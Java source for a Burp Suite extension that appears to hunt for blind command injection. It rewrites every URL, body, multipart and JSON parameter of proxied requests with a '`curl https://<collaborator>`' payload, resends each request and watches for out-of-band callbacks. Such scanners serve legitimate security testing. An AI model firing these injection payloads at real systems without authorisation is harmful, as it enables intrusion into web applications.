package rcehunter;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.CollaboratorClient;
import burp.api.montoya.http.message.ContentType;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.ParsedHttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.proxy.http.InterceptedRequest;
import burp.api.montoya.proxy.http.ProxyRequestHandler;
import burp.api.montoya.proxy.http.ProxyRequestReceivedAction;
import burp.api.montoya.proxy.http.ProxyRequestToBeSentAction;
import burp.api.montoya.http.message.params.HttpParameterType;

import com.google.gson.JsonParser;
import com.google.gson.stream.JsonReader;
import com.google.gson.JsonObject;
import com.google.gson.JsonElement;

import java.io.StringReader;
import java.util.Map;

public class MyProxyRequestHandler implements ProxyRequestHandler
{
    private final CollaboratorClient collaboratorClient;
    private final MontoyaApi api;

    public MyProxyRequestHandler(MontoyaApi api, CollaboratorClient collaboratorClient)
    {
        this.collaboratorClient = collaboratorClient;
        this.api = api;
    }

    @Override
    public ProxyRequestReceivedAction handleRequestReceived(InterceptedRequest interceptedRequest)
    {
        mutateRequest(interceptedRequest);
        return ProxyRequestReceivedAction.continueWith(interceptedRequest);
    }

    @Override
    public ProxyRequestToBeSentAction handleRequestToBeSent(InterceptedRequest interceptedRequest)
    {
        return ProxyRequestToBeSentAction.continueWith(interceptedRequest);
    }

    private void mutateRequest(HttpRequest request)
    {
        String payload = collaboratorClient.generatePayload().toString();
        payload = String.format("`curl https://%s`", payload);
        ParsedHttpParameter[] parameters = request.parameters().toArray(new ParsedHttpParameter[0]);

        for (ParsedHttpParameter parameter : parameters)
        {
            if (parameter.type() == HttpParameterType.URL || parameter.type() == HttpParameterType.BODY || parameter.type() == HttpParameterType.MULTIPART_ATTRIBUTE)
            {
                HttpParameter newParameter = HttpParameter.parameter(parameter.name(), payload, parameter.type());
                api.http().sendRequest(request.withParameter(newParameter));
                api.logging().logToOutput("Sent request with parameter: " + newParameter.name() + " = " + newParameter.value());
            }
        }

        if (request.contentType() == ContentType.JSON)
        {
            JsonReader jsonReader = new JsonReader(new StringReader(request.body().toString()));
            jsonReader.setLenient(true);

            JsonObject jsonObj = new JsonParser().parse(jsonReader).getAsJsonObject();
            traverseJsonAndMutateParameters(jsonObj, jsonObj, payload, request);
        }
    }

    private void traverseJsonAndMutateParameters(JsonElement jsonElement, JsonObject root, String payload, HttpRequest request) {
        if (jsonElement.isJsonObject()) {
            for (Map.Entry<String, JsonElement> entry : jsonElement.getAsJsonObject().entrySet()) {
                if (entry.getValue().isJsonPrimitive()) {
                    JsonElement original = entry.getValue();

                    // replace the value with the payload and send the request
                    jsonElement.getAsJsonObject().addProperty(entry.getKey(), payload);
                    api.http().sendRequest(request.withBody(root.toString()));
                    api.logging().logToOutput("Sent request with JSON payload: " + root);

                    // restore the original value
                    jsonElement.getAsJsonObject().add(entry.getKey(), original);
                } else {
                    traverseJsonAndMutateParameters(entry.getValue(), root, payload, request);
                }
            }
        } else if (jsonElement.isJsonArray()) {
            for (JsonElement element : jsonElement.getAsJsonArray()) {
                traverseJsonAndMutateParameters(element, root, payload, request);
            }
        }
    }
}